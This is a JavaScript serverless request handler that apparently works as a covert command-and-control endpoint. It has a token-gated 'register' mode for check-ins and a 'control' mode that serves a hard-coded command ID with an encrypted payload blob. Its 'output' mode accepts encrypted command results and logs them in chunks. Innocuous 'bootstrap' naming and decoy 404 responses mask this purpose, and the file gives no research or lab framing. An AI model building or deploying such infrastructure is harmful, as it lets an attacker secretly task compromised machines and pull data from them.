import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '31';
const CONTROL_PAYLOAD = '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';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
